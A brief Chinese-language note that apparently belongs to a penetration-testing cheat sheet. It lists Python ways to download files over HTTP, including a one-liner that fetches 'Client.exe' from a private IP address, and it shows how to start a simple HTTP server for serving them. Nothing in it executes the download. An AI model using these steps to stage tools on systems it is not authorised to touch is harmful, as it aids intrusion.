#### 方式1
    python -c 'import urllib;urllib.urlretrieve("http://192.168.1.192/Client.exe","/path/to/save/1.exe")'

#### 方式二

    #!/usr/bin/python   
	import urllib2   
	u = urllib2.urlopen('http://domain/file')   
	localFile = open('local_file', 'w')   
	localFile.write(u.read())   
	localFile.close()  

	执行：python test.py

#### 方式三

#### 搭建 HTTP server
	
	python2	
	python -m SimpleHTTPServer 1337 
		
	python3	
	python -m http.server 1337  
